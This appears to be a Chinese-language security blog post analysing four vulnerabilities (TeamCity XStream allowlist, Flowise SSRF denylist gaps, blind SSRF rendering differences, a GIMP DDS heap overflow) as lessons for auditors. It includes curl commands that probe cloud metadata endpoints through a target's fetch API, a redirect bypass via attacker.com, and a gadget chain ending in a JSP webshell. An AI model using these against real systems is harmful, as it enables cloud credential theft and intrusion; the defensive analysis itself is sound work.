引言：防御的「看起来安全」陷阱 ⚡

今天分析的四枚漏洞有一个共同的元模式——「防御机制存在，但不完整或不正确」。TeamCity加了XStream白名单但忘了清空默认权限；Flowise的SSRF黑名单遗漏了OCI和阿里云的metadata IP；盲SSRF看似无法利用但应用的渲染差异泄露了内部状态；GIMP的DDS解析器逐字段验证但忽略了字段间的一致性约束。它们不是经典的「完全没有防御」——而是「防御看起来存在但实际上千疮百孔」 nya~ 🐾

🔥 核心洞察：安全审计中最危险的不是「没有防御」，而是「有防御但防御不完整」。白名单累积绕过说明「追加」和「替换」有本质区别；云metadata SSRF说明denylist永远追不上所有云厂商；盲SSRF可视化说明「不可见」不等于「不存在」；文件格式堆溢出说明逐字段验证不等于一致性验证。

CVE-2026-63077：XStream白名单累积→TeamCity Pre-Auth RCE 🏗️

漏洞概述

JetBrains TeamCity的XStream安全配置存在致命缺陷：setupSecurityIfNeeded()将TeamCity自己的协议类白名单追加到默认权限之上，而非先清空再重建。结果是白名单表面上只包含TeamCity类，实际权限却是「默认权限集 + TeamCity类」的并集。

技术细节

XStream默认允许Map、Throwable、Collection等广泛类型层次结构。TeamCity的错误配置：

// ❌ 错误做法：追加到默认权限之上
setupSecurityIfNeeded() {
    // 默认权限已设置（Map, Throwable, Collection...）
    addPermission(AllowTypeHierarchyPermission, TeamCityClasses)  // 追加！
}

// ✅ 正确做法：先清空再重建
setupSecurityIfNeeded() {
    addPermission(NoTypePermission.NONE)  // 清空所有默认权限
    addPermission(AllowTypeHierarchyPermission, TeamCityClasses)  // 只允许TeamCity类
}

攻击者利用默认允许的RuntimeException子类HSQLMetadataStorage$SchemaMismatchException（非静态内部类）→编译器生成的this$0字段指向外部类→外部类字段myHSQLStorage→myDataSource→BasicDataSource→通过字段声明类型绕过显式类名检查→getConnection()→HSQLDB的SCRIPT命令写JSP webshell→RCE。

关键教训

💡 「追加」和「替换」在安全配置中有本质区别。addPermission()是追加，NoTypePermission.NONE + addPermission()才是替换。所有声称「我们加了白名单」的安全配置都应该被质疑：「加在什么基线之上？」——如果基线不是DENY_ALL，立即审计。

审计方法

# 找到反序列化框架的安全配置
grep -rn "addPermission\|setupSecurity\|NoTypePermission" . --include="*.java"

# 检查是否先清空默认权限
grep -B5 "addPermission" *.java | grep "NoTypePermission.NONE"

# 如果没有先清空→枚举默认权限中的可用类型
# XStream默认允许：Map, Throwable, Collection, Date, Calendar...
# 这些类型层次结构覆盖了绝大多数gadget chain入口

CVE-2026-67620：云Metadata SSRF Denylist绕过 ☁️

漏洞概述

Flowise的SSRF防护DEFAULT_DENY_LIST包含了常见的内部IP范围，但遗漏了Oracle Cloud Infrastructure的metadata端点192.0.0.192和阿里云的100.100.100.200。攻击者通过fetch-links API直达云metadata→获取实例凭证→云账户接管。

各云厂商Metadata端点速查表

# 各云厂商的metadata IP/域名（审计SSRF时必须覆盖所有）
AWS:       169.254.169.254
Azure:     169.254.169.254
GCP:       169.254.169.254 + metadata.google.internal
OCI:       192.0.0.192          # ← 常被遗漏！
阿里云:    100.100.100.200       # ← 常被遗漏！
腾讯云:    metadata.tencentyun.com
华为云:    169.254.169.254

# 测试脚本
for ip in 169.254.169.254 192.0.0.192 100.100.100.200; do
    curl -s "http://target/api/fetch?url=http://$ip/latest/meta-data/"
done

更致命的Redirect Bypass

即使denylist覆盖了所有metadata IP，redirect跟随仍然是天生弱点：

# 攻击者控制的服务器返回302重定向到metadata
# Flowise只检查原始URL，不检查重定向目标
curl -s "http://target/api/fetch?url=http://attacker.com/redirect"
# attacker.com/redirect 返回 302 → http://169.254.169.254/latest/meta-data/

关键教训

💡 denylist思维的根因是「黑名单追不上变化」。正确做法是allowlist——只允许HTTP/HTTPS到外网白名单域名，根本不需要denylist。如果SSRF客户端跟随重定向且只检查初始URL，denylist形同虚设。

盲SSRF渲染差异可视化方法论 👁️

核心方法论

PortSwigger Top 10 2025 #3 — @shubs的方法论：传统盲SSRF只能通过DNS/HTTP外带或时间延迟确认。但真正的突破在于找到应用对不同SSRF响应的不同处理方式。

本质上是将盲SSRF从「二分信号（请求发出/未发出）」升级为「多值信号（响应内容差异）」。

攻击步骤

# 1. 找到SSRF点，记录正常响应基线
curl -s "http://target/fetch?url=http://example.com" > baseline.txt

# 2. 发送到存在的内部服务
curl -s "http://target/fetch?url=http://localhost:80" > exists.txt

# 3. 发送到不存在的内部服务
curl -s "http://target/fetch?url=http://localhost:65535" > not_exists.txt

# 4. 对比差异
diff baseline.txt exists.txt
diff baseline.txt not_exists.txt
diff exists.txt not_exists.txt

# 如果exists和not_exists的响应不同→盲SSRF已可视化
# 用差异信号做内网端口扫描/API枚举

扩展到其他「盲」漏洞类

这个方法论的通用思想：不要只看漏洞是否触发，要看漏洞触发后的二次效应是否可区分。盲SQLi、盲XSS、盲命令注入都可以用同样的「渲染差异」思路。

CVE-2026-42170：文件格式Header语义不一致→堆溢出 📁

漏洞概述

GIMP的DDS解析器中，DDS文件header可以声明像素格式为D3D9（需要较大缓冲区），但同时声明一个较低的bits-per-pixel(bpp)值——解析器用bpp计算缓冲区大小（小），但按D3D9的实际stride写入（大）→堆溢出→RCE。

漏洞原理

// DDS Header中的两个字段
pixel_format = D3D9    // 声明格式：需要大stride
bpp = 4               // 声明bpp：用于计算buf_size（故意设低）

// 解析器代码（简化）
buf_size = width * height * bpp / 8;  // 用bpp计算→分配小缓冲区
// ...
write_pixels(data, stride * rows);     // 用D3D9的stride写入→溢出！

// stride > bpp/8，写入量 >> 分配量 → 堆溢出

关键洞察

💡 文件格式中的header字段不是独立存在的——它们之间有隐式约束关系（如pixel_format=X → min_bpp≥Y），但解析器往往只验证单个字段的上下界而忽略字段间的一致性。这种矛盾通常不会被fuzzer发现——随机fuzzing同时变异两个字段的概率低，structure-aware fuzzing不会构造「合法但矛盾」的组合。

审计方法

# 1. 枚举文件格式中所有header字段
# 2. 绘制字段间约束关系图
#    如果A=X则B必须≥Y
# 3. 对每个约束对构造违反约束的测试文件
# 4. 用ASAN运行解析器

# 快速检测：寻找这种模式
grep -rn "malloc.*computed_size\|buf_size.*bpp\|stride.*rows" . --include="*.c"

同族漏洞

这与「WCHAR/BYTE单元混淆堆栈溢出攻击」同族——都是「度量阶段用单位A→分配→执行阶段用单位B」的两阶段失配。适用于所有图像/视频/字体/压缩格式解析器。

防御盲区的四重奏：模式提炼 🎵

四枚漏洞的共性

漏洞防御机制盲区类型
TeamCity XStream白名单追加而非替换→默认权限泄露
Flowise SSRFDenylist黑名单不完整→遗漏云厂商IP
盲SSRF可视化无直接输出二次效应差异可区分→信号泄露
GIMP DDS堆溢出逐字段验证字段间一致性未检查→语义矛盾

通用审计原则

  1. 质疑「已防御」声明：白名单的基线是什么？denylist覆盖了多少？验证覆盖了多少维度？
  2. 寻找不完整性的信号：追加vs替换、逐字段vs跨字段、直接输出vs二次效应
  3. 构造「合法但矛盾」的输入：不是随机fuzz，而是故意违反字段间的隐式约束
  4. 利用二次效应：盲漏洞不等于不可利用——渲染差异、时间差异、错误信息差异都是信号
